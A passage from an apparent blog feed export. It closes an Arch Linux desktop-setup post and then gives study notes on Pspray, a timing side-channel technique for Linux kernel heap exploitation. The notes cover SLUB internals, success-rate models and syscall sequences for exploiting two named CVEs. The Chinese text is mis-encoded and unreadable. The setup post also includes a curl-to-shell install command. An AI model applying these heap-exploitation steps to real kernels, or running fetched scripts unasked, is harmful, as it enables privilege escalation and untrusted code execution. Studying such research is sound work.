è¿˜æ˜¯ç›¸å¯¹æ¥è¯´æ¯”è¾ƒå…»çœ¼ä¸€äº›ï¼Œè¿™é‡Œç¬”è€…å®‰è£…çš„æ˜¯ <code>latte-dock</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S latte-dock</span><br></code></pre></td></tr></table></figure><p>ç„¶å <code>alt + f2</code> è¾“å…¥ <code>latte</code> å°± ok äº†</p><p>æœ€åå†æ‘†æ”¾å„ç§ widgets è°ƒä¸€è°ƒ panel ä½ç½®å•¥çš„å·®ä¸å¤šå°± ok äº†ï¼Œæ•´ä½“æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2023/09/20/3bdIi6KA9c2ulNV.png"></p><h1 id="0x05-ä¸€äº›æŠ¥é”™çš„è§£å†³"><a href="#0x05-ä¸€äº›æŠ¥é”™çš„è§£å†³" class="headerlink" title="0x05. ä¸€äº›æŠ¥é”™çš„è§£å†³"></a>0x05. ä¸€äº›æŠ¥é”™çš„è§£å†³</h1><h3 id="pcieport-æŠ¥é”™"><a href="#pcieport-æŠ¥é”™" class="headerlink" title="pcieport æŠ¥é”™"></a>pcieport æŠ¥é”™</h3><p>å¯åŠ¨èµ·æ¥å‘ç°å†…æ ¸è«åå…¶å¦™åäº†ä¸€å¤§å †çš„å¥‡æ€ªçš„ä¸œè¥¿ï¼š</p><p><img src="https://s2.loli.net/2023/09/18/m71oVX2g489Or5s.jpg"></p><p>åœ¨ <code>/boot/grub/grub.cfg</code> ä¸­æ‰¾åˆ°å†…æ ¸å¯åŠ¨å‚æ•°ï¼Œæ·»åŠ ä¸Š <code>pci=nommconf</code> å³å¯</p><h3 id="chrome-æ— æ³•æ’­æ”¾è§†é¢‘"><a href="#chrome-æ— æ³•æ’­æ”¾è§†é¢‘" class="headerlink" title="chrome æ— æ³•æ’­æ”¾è§†é¢‘"></a>chrome æ— æ³•æ’­æ”¾è§†é¢‘</h3><p>å°±ä¸€ç›´å¡åœ¨åŠ è½½ç•Œé¢ä¸åŠ¨ï¼Œå‚è§ <a href="https://wiki.archlinux.org/title/PulseAudio/Troubleshooting#Browsers_load_videos_but_do_no_play">Wiki</a> ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥ä¸´æ—¶è§£å†³ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pulseaudio --<span class="hljs-built_in">kill</span> &amp;&amp; pulseaudio --start</span><br></code></pre></td></tr></table></figure><p>å®Œç¾çš„è§£å†³æ–¹æ¡ˆæ˜¯æ˜¯ç”¨ <code>pipewire-pulse</code> æ›¿æ¢æ‰ <code>pluseaudio</code> ä¸ <code>pluseaudio-bluetooth</code>ï¼Œç„¶åé‡å¯ï¼š</p><blockquote><p>å®‰è£…è¿™ä¸ªåŒ…çš„æ—¶å€™ä¼šè‡ªåŠ¨æŠŠå¦å¤–ä¸¤ä¸ªåŒ…ç»™å¸äº†</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S pipewire-pulse</span><br></code></pre></td></tr></table></figure><h1 id="0x06-ä¸ªäººé…ç½®ä¼˜åŒ–"><a href="#0x06-ä¸ªäººé…ç½®ä¼˜åŒ–" class="headerlink" title="0x06. ä¸ªäººé…ç½®ä¼˜åŒ–"></a>0x06. ä¸ªäººé…ç½®ä¼˜åŒ–</h1><h3 id="è§¦æ‘¸æ¿å¼€å¯ç‚¹æŒ‰å³å•å‡»"><a href="#è§¦æ‘¸æ¿å¼€å¯ç‚¹æŒ‰å³å•å‡»" class="headerlink" title="è§¦æ‘¸æ¿å¼€å¯ç‚¹æŒ‰å³å•å‡»"></a>è§¦æ‘¸æ¿å¼€å¯ç‚¹æŒ‰å³å•å‡»</h3><p>è§¦æ‘¸æ¿ä¹ æƒ¯æ€§çš„æ“ä½œåº”å½“æ˜¯æŒ‰ä¸€ä¸‹å°±æ˜¯å•å‡»ï¼Œè€ŒéæŒ‰ä¸‹æœºæ¢°å·¦é”®æ‰æ˜¯å•å‡»ï¼Œ KDE é»˜è®¤æ˜¯å…³é—­äº†è¿™ä¸ªé€‰é¡¹ï¼Œä¸è¿‡æˆ‘ä»¬åœ¨ç³»ç»Ÿè®¾ç½®ä¸­çš„ <code>Hardwareâ†’Input Devicesâ†’Touchpad</code> é‡Œå°† <code>Tap-to-click</code> å‹¾é€‰ä¸Šå³å¯</p><h3 id="è§¦æ‘¸æ¿ä¸Šä¸‹æ»‘åŠ¨æ–¹å‘æ”¹å˜"><a href="#è§¦æ‘¸æ¿ä¸Šä¸‹æ»‘åŠ¨æ–¹å‘æ”¹å˜" class="headerlink" title="è§¦æ‘¸æ¿ä¸Šä¸‹æ»‘åŠ¨æ–¹å‘æ”¹å˜"></a>è§¦æ‘¸æ¿ä¸Šä¸‹æ»‘åŠ¨æ–¹å‘æ”¹å˜</h3><p>ç¬”è€…çš„ä½¿ç”¨ä¹ æƒ¯ä¸­åŒæŒ‡æ»‘åŠ¨æ˜¯ä¸Šä¸‹åå‘ï¼ŒKDE ä¸­é»˜è®¤æ˜¯ä¸Šä¸‹åŒå‘ï¼Œè¿™é‡Œåªéœ€è¦åœ¨ç³»ç»Ÿè®¾ç½®ä¸­çš„ <code>Hardwareâ†’Input Devicesâ†’Touchpad</code> é‡Œå°† <code>Invert scroll direction (Natual scrolling)</code> å‹¾é€‰ä¸Šå³å¯</p><h3 id="è®¾ç½®åŒå‡»æ‰“å¼€æ–‡ä»¶"><a href="#è®¾ç½®åŒå‡»æ‰“å¼€æ–‡ä»¶" class="headerlink" title="è®¾ç½®åŒå‡»æ‰“å¼€æ–‡ä»¶"></a>è®¾ç½®åŒå‡»æ‰“å¼€æ–‡ä»¶</h3><p>Dolphin ä¸­é»˜è®¤å•å‡»å°±æ‰“å¼€æ–‡ä»¶äº†ï¼Œè€Œå¯¹äºç¬”è€…æ¥è¯´æ›´ä¹ æƒ¯ Windows é‚£æ ·çš„å•å‡»é€‰æ‹©åŒå‡»æ‰“å¼€çš„æ¨¡å¼ï¼Œè¿™é‡Œåªéœ€è¦åœ¨ç³»ç»Ÿè®¾ç½®ä¸­çš„ <code>Workspace Behaviour-&gt;General Behaviour</code> ä¸­å‹¾é€‰ <code>Selects them</code> å³å¯</p><h3 id="ä½¿ç”¨-zsh-æ›¿æ¢-bash"><a href="#ä½¿ç”¨-zsh-æ›¿æ¢-bash" class="headerlink" title="ä½¿ç”¨ zsh æ›¿æ¢ bash"></a>ä½¿ç”¨ zsh æ›¿æ¢ bash</h3><p><code>Z Shell</code> æ˜¯ä¸€ä¸ªæ¯”é»˜è®¤è‡ªå¸¦çš„ <code>bash</code> æ›´åŠ å¼ºå¤§çš„ shellï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡å¦‚ä¸‹å‘½ä»¤å³å¯å°†å½“å‰ç”¨æˆ·çš„é»˜è®¤ shell æ›¿æ¢ä¸º zshï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S zsh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><br></code></pre></td></tr></table></figure><p>åé¢å„ç§ä¸»é¢˜å•¥çš„é…ç½®å¯ä»¥å‚ç…§<a href="https://zhuanlan.zhihu.com/p/58073103">çŸ¥ä¹ä¸Šçš„è¿™ç¯‡æ–‡ç« </a>ï¼Œç¬”è€…ç”¨çš„æ˜¯ <code>gnzh</code> ä¸»é¢˜</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸å¥½ç”¨ï¼Œåœ¨å®‰è£…ç•Œé¢ç¡äº†ä¸‰ä¸ªå°æ—¶&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Arch Linux" scheme="https://arttnba3.github.io/tags/Arch-Linux/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x03ã€‘è®ºæ–‡ç¬”è®°ï¼šPspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique </title>
    <link href="https://arttnba3.github.io/2023/09/16/PAPER-0X03-PSPRAY/"/>
    <id>https://arttnba3.github.io/2023/09/16/PAPER-0X03-PSPRAY/</id>
    <published>2023-09-15T18:02:37.000Z</published>
    <updated>2023-09-15T18:43:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>ğŸµTHIS IS MY KINGDOM C*MğŸµ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>Linux kernel exploitation æ–¹å‘çš„è®ºæ–‡è™½ç„¶æ•°é‡æå°‘ï¼Œä½†èƒ½ä¸Šé¡¶ä¼šçš„å¤§éƒ¨åˆ†éƒ½è¿˜æŒºæœ‰æ„æ€çš„ï¼Œå°¤å…¶æ˜¯å‘åœ¨ USENIX 2023 ä¸Šçš„<a href="https://www.usenix.org/conference/usenixsecurity23/presentation/lee-yoochan">è¿™ä¸€ç¯‡è®ºæ–‡</a>ç¬”è€…è§‰å¾—æ˜¯<strong>éå¸¸æœ‰å®æˆ˜ä»·å€¼</strong>çš„ï¼ˆç¬‘ï¼‰ï¼Œå› æ­¤ç®€å•åšä¸ªå°ç¬”è®°</p><p>å› ä¸ºè¿™ä¸€é¢†åŸŸçš„è®ºæ–‡è¯»èµ·æ¥æ¯”è¾ƒè½»æ¾æ‰€ä»¥è¿™ä¸€ç¯‡ç¬”è€…åªä¼šè®°å½•å…¶ä¸­æ¯”è¾ƒç²¾åçš„éƒ¨åˆ†ï¼Œéƒ¨åˆ†åœ°æ–¹ä¸ä¸€å®šä¿ç•™è®ºæ–‡åŸæ–‡ï¼ˆè€Œæ˜¯ä¼šé€‰æ‹©åŒä¹‰è¯ä»£æ¢</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>æ”»å‡»çš„éšç§˜æ€§å¯¹äºæ”»å‡»è€…è€Œè¨€æ˜¯æœ€ä¸ºè‡³å…³é‡è¦çš„ï¼Œå› ä¸ºä¸€æ—¦æ”»å‡»è¢«å‘ç°å°±å¯„äº†ï¼Œä½†ç”±äº SLUB åˆ†é…å™¨çš„æ„é€ çš„ç¼˜æ•…æˆåŠŸå®Œæˆæ¼æ´åˆ©ç”¨çš„æ¦‚ç‡éƒ½è¾ƒä½</p><p>æœ¬æ–‡æå‡º $Pspray$ ï¼š<strong>ä¸€é¡¹åŸºäºæ—¶åºä¾§ä¿¡é“çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯</strong>ï¼Œç»æµ‹è¯•è¿™é¡¹æŠ€æœ¯å¯ä»¥æ˜¾è‘—æé«˜æ¼æ´åˆ©ç”¨çš„æˆåŠŸç‡</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>æ²¡å¿…è¦è®².jpg</del></p></blockquote><p>Linux kernel æœ‰ç€å¦‚ KCFIã€KASLRã€KDFI åœ¨å†…çš„å¤šç§ä¿æŠ¤æªæ–½ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…éš¾ä»¥æˆåŠŸå®Œæˆåˆ©ç”¨</p><p>å¯¹æ”»å‡»è€…è€Œè¨€æ”»å‡»çš„éšç§˜æ€§æ˜¯æœ€é‡è¦çš„éœ€æ±‚ä¹‹ä¸€ï¼Œè‹¥æ”»å‡»å¤±è´¥åˆ™å°†ä¼šè¢«é˜²å®ˆæ–¹å‘ç°ï¼Œå› ä¸ºè¿™é€šå¸¸ä¼šç•™ä¸‹ç—•è¿¹ï¼ˆä¾‹å¦‚ kernel panicï¼‰ï¼Œå› æ­¤æ”»å‡»è€…éå¸¸éœ€è¦æé«˜æ”»å‡»çš„æˆåŠŸç‡</p><p>å†…æ ¸æ¼æ´å¤§éƒ½ä¸ºå †ä¸Šæ¼æ´ï¼ˆä¾‹å¦‚ç”± syzkaller æ‰¾åˆ°çš„ 1107 ä¸ªæ¼æ´ä¸­æœ‰ 968 ä¸ªéƒ½æ˜¯å †ç›¸å…³çš„ï¼‰ï¼Œè€Œå¯¹æ”»å‡»è€…è€Œè¨€è¦å®Œæˆåˆ©ç”¨ååˆ†å›°éš¾ï¼Œå› ä¸ºè¿™éœ€è¦æ”»å‡»è€…èƒ½é¢„æµ‹å½“å‰çš„å †åˆ†é…å™¨çŠ¶æ€ï¼Œè€Œå†…æ ¸å †ç®¡ç†å™¨ SLUB çš„ç»“æ„ä½¿å…¶éš¾ä»¥è¢«å®Œæˆ</p><blockquote><p>è¿™é‡ŒåŸè®ºæ–‡è¿˜ä¸¾äº†ä¸ªä¾‹å­ï¼ŒğŸ‘´å°±â‘§æ‘˜æŠ„äº†ï¼Œæ¯•ç«Ÿçœ‹è¿™ç¯‡è®ºæ–‡çš„å‰æè‚¯å®šæ˜¯é»˜è®¤å¸¦ğŸ”¥éƒ½æ˜¯ä¼šç‚¹ kernel pwn çš„ï¼Œ<del>ä¸ä¼š kernel pwn ä½ çœ‹è¿™ç¯‡è®ºæ–‡å¹²å•¥å˜›</del></p></blockquote><p>æœ¬æ–‡æå‡ºä¸€ç§åä¸º $PSPRAY$ çš„æ–°çš„å†…æ ¸å †åˆ©ç”¨æ‰‹æ³•ï¼Œå…¶å¯ä»¥æ˜¾è‘—åœ°æå‡å¯¹æŠ— slab freelist éšæœºåŒ–ç­‰ä¿æŠ¤æªæ–½çš„å †åˆ©ç”¨çš„æˆåŠŸç‡ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œ $PSPRAY$ çš„æ ¸å¿ƒæ˜¯ä½¿ç”¨æ—¶åºä¾§ä¿¡é“æ¥é—´æ¥è·å– slab çš„åˆ†é…çŠ¶æ€</p><p>æœ¬æ–‡å·¥ä½œæ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li><strong>åˆ†æäº†å †åˆ©ç”¨çš„å¤±è´¥æƒ…å†µ</strong></li><li><strong>æ–°çš„å †åˆ©ç”¨æŠ€æœ¯</strong></li><li><strong>æ–°çš„é˜²å¾¡æŠ€æœ¯</strong></li></ul><h1 id="0x02-Background"><a href="#0x02-Background" class="headerlink" title="0x02. Background"></a>0x02. Background</h1><h2 id="2-1-SLUB-allocator"><a href="#2-1-SLUB-allocator" class="headerlink" title="2.1 SLUB allocator"></a>2.1 SLUB allocator</h2><blockquote><p>å»ºè®®ç›´æ¥çœ‹ğŸ‘´çš„<a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">è¿™ç¯‡åšå®¢</a></p></blockquote><h4 id="The-architecture-of-SLUB-allocator"><a href="#The-architecture-of-SLUB-allocator" class="headerlink" title="The architecture of SLUB allocator"></a>The architecture of SLUB allocator</h4><p>SLUB æ˜¯ Linux kernel é»˜è®¤çš„å †åˆ†é…å™¨ï¼Œå…¶åŸºæœ¬ç»“æ„å¦‚å›¾ 1 æ‰€ç¤ºï¼Œå…¶åŒ…å«äº†å¤šä¸ªä¸åŒç±»å‹ä¸å°ºå¯¸çš„ <code>kmem_cache</code> å†…å­˜æ± ï¼Œæ¯ä¸ª <code>kmem_cache</code> éƒ½æœ‰ä¸€ä¸ª per-CPU å†…å­˜æ± ï¼Œå…¶ä¸­åŒ…å«ç‹¬ç«‹çš„ $freelist$ ã€$page$ ã€$partial$ ï¼Œ$freelist$ ä¸ºä¸€ä¸ªåŸºäº $page$ é¡µé¢ä¸Šç©ºé—²å¯¹è±¡æ‰€ç»„æˆçš„å•å‘é“¾è¡¨</p><p>é™¤äº† $freelist$  ä»¥å¤–ï¼Œæ¯ä¸ª slab éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ $freelist$ ï¼›é™¤äº† $CPU\ partial\ page\ freelist$ ä»¥å¤–ï¼Œæ¯ä¸ª node ä¹Ÿæœ‰è‡ªå·±ç‹¬ç«‹çš„ $CPU\ partial\ page\ freelist$ ï¼Œåœ¨  $CPU\ partial\ page\ freelist$ ç”¨å®Œä¹‹åå¯ç”¨</p><p><img src="https://s2.loli.net/2023/09/13/JNkMTZ1s7RQ4DqB.png"></p><h4 id="Allocation-sequence-of-SLUB-allocator"><a href="#Allocation-sequence-of-SLUB-allocator" class="headerlink" title="Allocation sequence of SLUB allocator"></a>Allocation sequence of SLUB allocator</h4><p>å›¾ 2 å±•ç¤ºäº† SLUB çš„åˆ†é…æµç¨‹ï¼š</p><ul><li>é¦–å…ˆå°è¯•ä» $CPU\ freelist$ ä¸Šå–</li><li>$CPU-freelist$ ä¸ºç©ºï¼Œå°è¯•ä» $CPU\ page$ ä¸Šå– $freelist$ï¼Œç»™å›  $CPU\ freelist$ ï¼ˆå¯ä»¥ç†è§£ä¸º percpu freelist çš„åˆå§‹åŒ–ï¼‰</li><li>$CPU-page$ ä¹Ÿç©ºäº†ï¼Œå°è¯•ä» $CPU\ partial$ é“¾è¡¨ä¸Šå–</li><li>$CPU\ partial$ é“¾è¡¨ä¹Ÿç©ºäº†ï¼Œå°è¯•ä»  $NODE\ partial$ é“¾è¡¨ä¸Šå–</li><li>$NODE\ partial$ é“¾è¡¨ä¹Ÿç©ºäº†ï¼Œåªå¥½è½¬å‘ $Buddy\ System$ è¯·æ±‚åˆ†é…æ–°çš„å†…å­˜é¡µ</li></ul><blockquote><p>buddy system ä¹Ÿç©ºäº†å°±è¯¥ OOM kill äº†ï¼ˆæ‚²</p></blockquote><p><img src="https://s2.loli.net/2023/09/13/zGYbCeZSf41IqdF.png"></p><h2 id="2-2-Slab-Freelist-Random"><a href="#2-2-Slab-Freelist-Random" class="headerlink" title="2.2 Slab Freelist Random"></a>2.2 Slab Freelist Random</h2><p>ç®€å•æ¥è¯´å°±æ˜¯ <code>CONFIG_SLAB_FREELIST_RANDOM</code> è¿™ä¸ªä¿æŠ¤çš„å¼€å¯ä¼šä½¿å¾— $freelist$ çš„åˆå§‹åŒ–æ›´åŠ éšæœºåŒ–ï¼Œç©ºé—²å¯¹è±¡é“¾è¡¨è¿æ¥ä¸å†æŒ‰å¸¸è§„çš„åœ°å€é¡ºåºè¿æ¥ï¼Œè€Œæ˜¯ä¼šè¢«æ‰“ä¹±</p><p><img src="https://s2.loli.net/2023/09/13/fUMnhteR78rXZOA.png"></p><h1 id="0x03-Exploitation-method-and-failure-cases"><a href="#0x03-Exploitation-method-and-failure-cases" class="headerlink" title="0x03. Exploitation method and failure cases"></a>0x03. Exploitation method and failure cases</h1><p>æœ¬èŠ‚ä¸»è¦è®²å¸¸è§„çš„æ¼æ´åˆ©ç”¨æ‰‹æ³•</p><h2 id="3-1-Out-Of-Bounds"><a href="#3-1-Out-Of-Bounds" class="headerlink" title="3.1 Out-Of-Bounds"></a>3.1 Out-Of-Bounds</h2><h4 id="Exploitation-method"><a href="#Exploitation-method" class="headerlink" title="Exploitation method"></a>Exploitation method</h4><p>OOB å°±æ˜¯è¶Šç•Œè¯»å†™ï¼Œé€šå¸¸æ¥è¯´æˆ‘ä»¬éœ€è¦åœ¨æ¼æ´å¯¹è±¡åé¢æ”¾ä¸€ä¸ªè¢«æº¢å‡ºçš„ç›®æ ‡å¯¹è±¡ï¼Œæœ€ç®€å•çš„åšæ³•å°±æ˜¯ç›´æ¥<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x06-Kernel-Heap-Heap-Spraying">å †å–·</a>å°±å®Œäº‹äº†</p><p><img src="https://s2.loli.net/2023/09/13/E9hJxTW1ajNmvYe.png"></p><h4 id="Failure-cases"><a href="#Failure-cases" class="headerlink" title="Failure cases"></a>Failure cases</h4><p>ä½†å› ä¸ºåœ°å€éšæœºåŒ–çš„å­˜åœ¨ï¼Œæˆ‘ä»¬çš„è¢«æº¢å‡ºç›®æ ‡å¯¹è±¡ä¸ä¸€å®šèƒ½æ°å¥½è½åœ¨æ¼æ´å¯¹è±¡åé¢ï¼Œä¸­é—´å¯èƒ½éš”äº†å‡ ä¸ªå¯¹è±¡æˆ–è€…ç›´æ¥å°±é”™ä½äº†ï¼š(</p><p><img src="https://s2.loli.net/2023/09/13/ZpbTYHlzVqhLmO5.png"></p><h4 id="Probability-model"><a href="#Probability-model" class="headerlink" title="Probability model"></a>Probability model</h4><p>åœ¨å¼€å¯ freelist éšæœºåŒ–ä¹‹åçš„æ¼æ´åˆ©ç”¨æˆåŠŸç‡å¦‚ä¸‹ï¼ŒåŸºäº Linux kernel ä½¿ç”¨ <code>Fisher-Yates shuffle</code> ç®—æ³•æ¥è¿›è¡ŒéšæœºåŒ–è¿™ä¸ªå‰æè®¡ç®—çš„ï¼Œå…¶ä¸­ $N$ ä¸ºä¸€å¼  slub ä¸Šçš„æ€»å¯¹è±¡æ•°ï¼ŒåŒæ—¶æˆ‘ä»¬å‡è®¾åœ¨åŒä¸€å¼  slab ä¸Šåˆ†é…äº† 1 ä¸ªæ¼æ´å¯¹è±¡ä¸ $k$ ä¸ª victim å¯¹è±¡ï¼š</p><p>$$<br>\frac{ _{N-1} C _{k}* _{k} C _{1}}{ _{N} C _{k} * _{N-k} C _{1}} &#x3D; \frac{k}{N}<br>$$</p><p>æ€»ä½“è€Œè¨€ï¼Œæˆ‘ä»¬ä» $N$ ä¸ªç©ºé—²å¯¹è±¡ä¸­é€‰æ‹© $k$ ä¸ª victim å¯¹è±¡ ä¸ 1 ä¸ªæ¼æ´å¯¹è±¡ï¼Œåœ¨è¿›è¡Œåˆ©ç”¨æ—¶ victim å¯¹è±¡ä¸æ¼æ´å¯¹è±¡å¿…é¡»ç›¸é‚»ï¼Œå› æ­¤æˆ‘ä»¬ä» $N-1$ ä¸ªå¯¹è±¡ä¸­å–å‡º $k$ ä¸ªå¯¹è±¡ï¼ˆå‰©ä½™ä¸€ä¸ªä½œä¸ºæ¼æ´å¯¹è±¡ï¼‰ï¼Œå–·å°„çš„ victim å¯¹è±¡æ•°é‡å¯ä»¥ä» 0 åˆ° $N-1$ ï¼Œå› æ­¤å¯¹äºå¸¦æœ‰ random slab freelist çš„ OOB åˆ©ç”¨è€Œè¨€çš„æˆåŠŸç‡è®¡ç®—å¦‚ä¸‹ï¼š</p><p>$$<br>P_{OOB}^{Baseline}&#x3D;\frac{\sum_{k&#x3D;0}^{N-1}\frac{k}{N}}{N}&#x3D;\frac{N-1}{2N}<br>$$</p><h2 id="3-2-Use-After-Free-and-Double-Free"><a href="#3-2-Use-After-Free-and-Double-Free" class="headerlink" title="3.2 Use-After-Free and Double-Free"></a>3.2 Use-After-Free and Double-Free</h2><h4 id="UAF-exploitation-method"><a href="#UAF-exploitation-method" class="headerlink" title="UAF exploitation method"></a>UAF exploitation method</h4><p>UAF æ¼æ´çš„åˆ©ç”¨é€šå¸¸æ˜¯è¦å°†æ¼æ´å¯¹è±¡ä¸ victim å¯¹è±¡æ”¾åœ¨åŒä¸€å†…å­˜åœ°å€ï¼Œå›¾ 6 å±•ç¤ºäº†å¯¹ CVE-2019-2215 çš„åˆ©ç”¨è¿‡ç¨‹ï¼Œé¦–å…ˆç”¨ <code>epoll_ctl()</code> åˆ†é…æ¼æ´å¯¹è±¡ï¼Œæ¥ä¸‹æ¥ç”¨ <code>ioctl()</code> é‡Šæ”¾æ¼æ´å¯¹è±¡ï¼Œéšåç”¨ <code>msgsnd()</code> å–å›åˆšåˆšé‡Šæ”¾çš„å¯¹è±¡ï¼Œæœ€åå†ç”¨ <code>close()</code> å°†è¯¥å¯¹è±¡é‡Šæ”¾</p><p><img src="https://s2.loli.net/2023/09/15/mP3yD9Yq2lKIgWQ.png"></p><h4 id="DF-exploitation-method"><a href="#DF-exploitation-method" class="headerlink" title="DF exploitation method"></a>DF exploitation method</h4><blockquote><p>åœ¨ç¬”è€…çœ‹æ¥ DF å’Œ UAF æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„</p></blockquote><p>Double Free æ¼æ´åˆ™æ˜¯å°†ä¸€ä¸ªå·²ç»è¢«é‡Šæ”¾çš„å¯¹è±¡å†æ¬¡é‡Šæ”¾ï¼Œä»è€Œé€šè¿‡ç•™ä¸‹çš„å‚æ‚¬æŒ‡é’ˆå®Œæˆåˆ©ç”¨ï¼ˆç¬”è€…æ³¨ï¼šå…¶å®å°±æ˜¯ UAF å˜›ï¼‰ï¼Œå›¾ 7 å±•ç¤ºäº†å¯¹ CVE-2017-6074 çš„åˆ©ç”¨è¿‡ç¨‹ï¼Œé¦–å…ˆé€šè¿‡ <code>connect()</code> åˆ†é…æ¼æ´å¯¹è±¡ä¸ä¸‰ä¸ªé¢å¤–çš„å¯¹è±¡å†°é‡Šæ”¾æ‰æ¼æ´å¯¹è±¡ï¼Œéšåé€šè¿‡ <code>msgsnd()</code> åˆ†é… victim å¯¹è±¡ï¼Œæ¥ä¸‹æ¥é€šè¿‡ <code>shutdown()</code> å®Œæˆ DF å°† victim å¯¹è±¡é‡Šæ”¾æ‰ï¼Œæœ€ååˆ†é…ç›®æ ‡å¯¹è±¡ï¼Œå½“æˆ‘ä»¬è®¿é—® victim å¯¹è±¡æ—¶ç›®æ ‡å¯¹è±¡ä¾¿ä¼šè¢«ç ´å</p><p><img src="https://s2.loli.net/2023/09/15/mZLUcSAIPhW7TOJ.png"></p><h4 id="Failure-cases-1"><a href="#Failure-cases-1" class="headerlink" title="Failure cases"></a>Failure cases</h4><p>ç”±äº SLUB çš„ç‰¹æ€§ï¼Œå¯¹ UAF ä¸ DF æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰å¯èƒ½å¤±è´¥çš„ï¼Œå›¾ 8 æ˜¾ç¤ºäº†åˆ©ç”¨ UAF&#x2F;DF æ¼æ´å¤±è´¥çš„ä¸€ç§å¯èƒ½æ€§ï¼Œå³é¢å¤–çš„â€œå™ªå£°â€åˆ†é…å¯¼è‡´äº† perCPU page å‘ç”Ÿäº†æ”¹å˜</p><blockquote><p>ç¬”è€…æ³¨ï¼šæ¯”å¦‚è¯´ <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">key_ctl</a> è¿™æ ·çš„</p></blockquote><p><img src="https://s2.loli.net/2023/09/15/revXByanRGVKmS1.png"></p><h4 id="Probability-model-1"><a href="#Probability-model-1" class="headerlink" title="Probability model"></a>Probability model</h4><p>UAF ä¸ DF æ¼æ´åˆ©ç”¨çš„æˆåŠŸç‡å¦‚ä¸‹ï¼Œ$N$ ä¸ºæ¯å¼  slab ä¸Šçš„å¯¹è±¡æ•°é‡ï¼Œ $A$ ä¸ºç³»ç»Ÿè°ƒç”¨æ‰€åˆ†é…çš„å¯¹è±¡æ•°é‡ï¼ˆå³åˆ†é…çš„æ¼æ´å¯¹è±¡æ•°é‡ä¸é¢å¤–ç»“æ„ä½“çš„æ•°é‡ä¹‹å’Œï¼‰ï¼š</p><p><img src="https://s2.loli.net/2023/09/16/so5iPEvlCcuBtjN.png"></p><blockquote><p>è¿™é‡Œç”¨ Latex æ‰“ä¸å‡ºæ¥åªèƒ½ä¸Šå›¾äº†ï¼Œå› ä¸ºç¬”è€…åšå®¢çš„ latex æ”¯æŒéå¸¸æ®‹ç–¾ï¼ˆæ‚²</p></blockquote><p>æœ‰ä¸¤ç§æƒ…å†µï¼šå½“ <code>A &lt; N</code> æ—¶ï¼ŒæˆåŠŸç‡å†³å®šäºæ¼æ´å¯¹è±¡ä¸é¢å¤–å¯¹è±¡æ˜¯å¦åœ¨åŒä¸€å¼  slab ä¸Šï¼›å½“ <code>A &gt;= N</code> æ—¶ï¼Œå½“åˆ†é…æ¼æ´å¯¹è±¡çš„ç³»ç»Ÿè°ƒç”¨æ‰€åˆ†é…çš„æœ€åä¸€ä¸ªå¯¹è±¡å®Œå…¨å¡«å…… CPU page æ—¶åˆ©ç”¨å°†ä¼šæˆåŠŸï¼Œè‹¥ä¸€å¼  slab è¢«è€—å°½ï¼Œå¯¹åº”çš„ slab ä¼šè¢«ç§»åŠ¨åˆ° full é“¾è¡¨ä¸Šï¼ŒCPU page ä¾¿å˜ä¸ºç©ºï¼Œæ­¤æ—¶è‹¥å¯¹è±¡è¢«é‡Šæ”¾ï¼Œåˆ™åŒ…å«è¯¥å¯¹è±¡çš„ slab å°†é‡æ–°å˜ä¸º CPU page</p><h1 id="0x04-Our-Approach-PSPRAY"><a href="#0x04-Our-Approach-PSPRAY" class="headerlink" title="0x04. Our Approach : PSPRAY"></a>0x04. Our Approach : PSPRAY</h1><p>æ¼æ´åˆ©ç”¨å¤±è´¥çš„ä¸»è¦åŸå› æ˜¯å¯¹ slab 